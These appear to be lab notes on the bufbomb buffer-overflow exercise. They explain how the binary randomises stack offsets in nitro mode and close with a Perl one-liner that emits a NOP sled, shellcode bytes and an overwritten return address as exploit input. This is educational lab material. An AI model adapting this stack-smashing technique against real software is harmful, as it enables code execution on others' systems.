bufbomb uses the following mechanism to arrange the exact stack position:
	+ At first it prepares a section called bstack that start exactly from address 0x55586000, then it uses anonymous mmap to allocate memory from that section and change esp value to that address to relocate the stack space.
	+ It calculates a random called cookie_tweak from input userid.
		/* Set up random stack offsets for nitro mode */
    	srandom(cookie);
    	cookie_tweak =  (random() & 0x0FF0) + 0x100;
	+ It prepares an array of 5 numbers with first value is 0 and the others are random numbers within range (-128, 128].
		offsets = (int *) calloc(cnt, sizeof(int));
    	offsets[0] = 0;
    	for (i = 1; i < cnt; i++)
        	/* Random number x s.t. |x| <= 128 & x is multiple of 16 */
        	offsets[i] = 128 - (random() & 0xF0);
    + It uses alloca(cookie_tweak + offsets[i]) to stabilize and adjust the stack top of test and testn function.
    In the first run offsets[0] = 0 => the stack top of test and testn function always the same (0x55683574).
    In the consecutive runs offsets[i] => the stack top is adjusted as much as +- 128 from the stack's position of first run 0x55683574.

=> use the following Perl script to generate exploit sequence:
perl -e 'print "90 "x509,"8d 6c 24 28 68 3a 8e 04 08 b8 37 dd f6 6c c3 ","bc 33 68 55"' > test
